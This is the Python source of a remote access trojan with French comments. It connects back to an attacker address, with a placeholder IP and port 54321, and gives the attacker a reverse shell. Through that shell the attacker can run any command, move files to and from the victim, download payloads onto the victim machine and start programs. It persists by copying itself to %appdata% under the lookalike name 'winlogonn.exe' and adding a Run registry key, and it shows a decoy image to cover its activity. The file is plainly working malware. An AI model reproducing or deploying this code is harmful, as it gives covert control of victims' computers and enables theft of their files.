import socket #Pour connexions
import subprocess #Pour execution de commandes
import json #Pour envoi/reception de donnees
import os
import sys #Pour la copie
import base64 #Pour l'encodage
import shutil #Pour la copie
import time #Pour l'envoi toutes les 20 secondes
import requests
import threading

#Envoi de donnees
def envoi(data):
        json_data = json.dumps(data)
        s.send(json_data)

#Reception de donnees
def reception():
        data = ""
        while True:
                try: #Reception de donnee 1024 par 1024 tant qu'on a pas tout >
                        data = data + s.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue

#Connexion
def connexion():
	while True:
		time.sleep(20)

		try:
      # Inscrire l'IP de la cible
      s.connect(("255.255.255.255",54321)) #Connexion
			shell() #Connexion reussie
		except:
			#Essai toutes les 20 secondes
			connexion() #Sinon, autre tentative

def estADMIN():
	global admin

	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
	except:
		admin = "Vous n'etes pas admin..."
	else: #Si ca marche
		admin = "VOUS ETES ADMIN !!"

def downloadINTERNET(url):
	get_reponse = requests.get(url)
	nom_fichier = url.split("/")[-1]
	with open(nom_fichier, "wb") as fichier:
		fichier.write(get_reponse.content)

#Backdoored
def shell():
	while True:
		commande = reception() #La cible recoit notre commande
		if commande == 'quit': #Si c'est quit c'est la fin
			break
		elif commande == "help":
			options = '''\n============================ AIDE ================================
download <chemin_sur_cible>    ==> Telecharge un fichier sur le PC de la victime
upload <chemin_sur_attaquant>  ==> Envoie un fichier sur le pc de la victime
get <URL>                      ==> Telecharge un fichier/site google sur le pc de la victime
start <chemin/nom application> ==> Demarre une application sur le pc de la victime
admin				 ==> Verifie si vous avez les droits administrateur
quit				 ==> Met FIN a la session
=================================================================\n'''
			envoi(options.decode("ascii","ignore"))
		#Si commande "cd" et contenu apres "cd "
		elif commande[:2] == "cd" and len(commande) > 1:
			try:
				os.chdir(commande[3:]) #Changement de repertoire
			except:
				continue
		elif commande[:8] == "download":
                        #Ouverture fichier a prendre (read car envoi)
			with open(commande[9:], "rb") as fichier:
				envoi(base64.b64encode(fichier.read()).decode("ascii","ignore"))
                elif commande[:6] == "upload":
			with open(commande[7:], "wb") as fichier:
				data = reception()
				fichier.write(base64.b64decode(data))
		elif commande[:5] == "start":
			try:
				subprocess.Popen(commande[6:], shell=True)
				envoi("Demarrage du programme...".decode("ascii","ignore"))
			except:
				envoi("Le programme n'a pas pu demarrer...".decode("ascii","ignore"))
		elif commande[:3] == "get":
			try:
				downloadINTERNET(commande[4:])
				envoi("Fichier telecharge!".decode("ascii","ignore"))
			except:
				envoi("Echec du telechargement...".decode("ascii","ignore"))
		elif commande[:5] == "admin":
			try:
				estADMIN()
				envoi(admin.decode("ascii","ignore"))
			except:
				envoi("Impossible de verifier si vous etes admin...".decode("ascii","ignore"))
		else: #Toute autre commande
			proc = subprocess.Popen(commande, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			resultat = proc.stdout.read() + proc.stderr.read()
			#Si pas de decode : Ne fonctionne pas !
			envoi(resultat.decode("ascii","ignore"))

#Endroit de la copie du RAT dans %appdata%
nouvelEndroit = os.environ["appdata"]+"\\winlogonn.exe"

#Si copie deja existante on ne copie pas
if not os.path.exists(nouvelEndroit):
	shutil.copyfile(sys.executable, nouvelEndroit)
	#Ajout cle de registre
	subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v winlogonn /t REG_SZ /d "' + nouvelEndroit + '"', shell=True)

	image = sys._MEIPASS + "\SUNBURST.jpg"
	try:
		subprocess.Popen(image, shell=True)
	except:
		nb1 = 1
		nb2 = 2
		res = nb1+nb2


#IPv4 TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion()

#Fin
s.close()
